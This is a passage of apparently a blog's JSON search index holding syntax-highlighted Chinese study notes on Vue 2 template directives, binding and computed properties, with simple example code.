class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;cpn&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">slot</span> <span class=\"attr\">:data</span>=<span class=\"string\">&quot;pLanguage&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">v-for</span>=<span class=\"string\">&quot;item in pLanguage&quot;</span>&gt;</span>&#123;&#123;item &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">slot</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        components: &#123;</span><br><span class=\"line\">            cpn: &#123;</span><br><span class=\"line\"><span class=\"javascript\">                template: <span class=\"string\">&#x27;#cpn&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"function\"><span class=\"title\">data</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                    <span class=\"keyword\">return</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                        pLanguage: [<span class=\"string\">&#x27;test1&#x27;</span>, <span class=\"string\">&#x27;test2&#x27;</span>, <span class=\"string\">&#x27;test3&#x27;</span>]</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["Program"],"tags":["vue"]},{"title":"vue2学习笔记","url":"http://blog.le31ei.top/2021/01/25/vue2学习笔记/","content":"<h1 id=\"1-模板语法\"><a href=\"#1-模板语法\" class=\"headerlink\" title=\"1.  模板语法\"></a>1.  模板语法</h1><h2 id=\"1-1-常见指令\"><a href=\"#1-1-常见指令\" class=\"headerlink\" title=\"1.1 常见指令\"></a>1.1 常见指令</h2><p><strong>v-once</strong></p>\n<p>只渲染一次，后续对值的改动不再变化</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">v-once</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span>   //后续在console中输入app.message=”xxxx“，该处的值不会发生变化</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            message: <span class=\"string\">&quot;123&quot;</span>  </span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>v-html</strong></p>\n<p>对值为html代码的转换成html格式输出</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">&#123;&#123;url&#125;&#125;  // 输出原始字符串格式</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">v-html</span>=<span class=\"string\">&quot;url&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span>  // 会对a标签转换成html格式进行输出</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            message: <span class=\"string\">&quot;123&quot;</span>,</span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">            url: &quot;<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&#x27;https://www.baidu.com&#x27;</span>&gt;</span>百度<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span>&quot;</span></span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>v-text</strong></p>\n<p>与<code>&#123;&#123;&#125;&#125;`语法相似，接收一个string类型进行输出\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">v-text</span>=<span class=\"string\">&quot;message&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            message: <span class=\"string\">&quot;123&quot;</span></span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n**v-pre**\n\n对代码进行原样输出\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">v-pre</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span>     // 输出内容为&#123;&#123;message&#125;&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            message: <span class=\"string\">&quot;123&quot;</span></span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n## 1.2 v-bind\n\n动态绑定到某个属性上，不能使用`&#123;&#123;&#125;&#125;</code>语法的时候，比如绑定a便签的href属性，img的src属性的情况。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">v-bind:src</span>=<span class=\"string\">&quot;img&quot;</span>/&gt;</span></span><br><span class=\"line\">  //简写</span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">:src</span>=<span class=\"string\">&quot;img&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            message: <span class=\"string\">&quot;123&quot;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">            img: <span class=\"string\">&#x27;https://img-blog.csdnimg.cn/20200221154143875.png&#x27;</span></span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>动态绑定class</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;active&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">:class</span>=<span class=\"string\">&quot;active&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">:class</span>=<span class=\"string\">&quot;&#123;active: isActive, line: false&#125;&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span>   // 对象的形式，决定是否加入class属性</span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">:class</span>=<span class=\"string\">&quot;[&#x27;active&#x27;,&#x27;line&#x27;]&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span>   // 数组形式</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            message: <span class=\"string\">&quot;123&quot;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">            active: <span class=\"string\">&#x27;active&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">            isActive: <span class=\"literal\">true</span></span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>动态绑定style</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">:style</span>=<span class=\"string\">&quot;&#123;fontSize: size&#125;&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">:style</span>=<span class=\"string\">&quot;&#123;fontSize: &#x27;50px&#x27;&#125;&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\"><span class=\"javascript\">           message: <span class=\"string\">&#x27;testme&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">            size: <span class=\"string\">&#x27;50px&#x27;</span></span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"1-3-计算属性\"><a href=\"#1-3-计算属性\" class=\"headerlink\" title=\"1.3 计算属性\"></a>1.3 计算属性</h2><p>将数据经过某些计算，生成新的属性</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">    &#123;&#123;fullName&#125;&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            firstName: <span class=\"string\">&#x27;testme&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">            lastName: <span class=\"string\">&#x27;123&#x27;</span></span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        computed: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            fullName: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.firstName + <span class=\"string\">&#x27; &#x27;</span> + <span class=\"built_in\">this</span>.lastName</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>总价格: &#123;&#123;allPrice&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\">            books: [</span><br><span class=\"line\"><span class=\"javascript\">                &#123;<span class=\"attr\">id</span>: <span class=\"number\">100</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;book1&#x27;</span>, <span class=\"attr\">price</span>: <span class=\"number\">100</span>&#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">                &#123;<span class=\"attr\">id</span>: <span class=\"number\">102</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;book2&#x27;</span>, <span class=\"attr\">price</span>: <span class=\"number\">101</span>&#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">                &#123;<span class=\"attr\">id</span>: <span class=\"number\">103</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;book3&#x27;</span>, <span class=\"attr\">price</span>: <span class=\"number\">102</span>&#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">                &#123;<span class=\"attr\">id</span>: <span class=\"number\">104</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;book4&#x27;</span>, <span class=\"attr\">price</span>: <span class=\"number\">103</span>&#125;</span></span><br><span class=\"line\">            ]</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        computed: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            allPrice: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"keyword\">let</span> total = <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">this</span>.books.length; i++)&#123; <span class=\"comment\">// es6: for (let item of this.books)直接取得对象</span></span></span><br><span class=\"line\"><span class=\"javascript\">                    total = total+ <span class=\"built_in\">this</span>.books[i].price</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"keyword\">return</span> total</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>getter和setter</strong></p>\n<p>一般不会使用set方法，get可以直接省略掉</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">&#123;&#123;fullName&#125;&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            firstName: <span class=\"string\">&#x27;test&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">            lastName: <span class=\"string\">&#x27;testme&#x27;</span></span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        computed: &#123;</span><br><span class=\"line\">            fullName: &#123;</span><br><span class=\"line\"><span class=\"javascript\">                set: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                    <span class=\"built_in\">this</span>.firstName = <span class=\"string\">&#x27;qerty&#x27;</span>  <span class=\"comment\">// 一般不会使用set方法，作为只读属性使用</span></span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\"><span class=\"javascript\">                get: <span 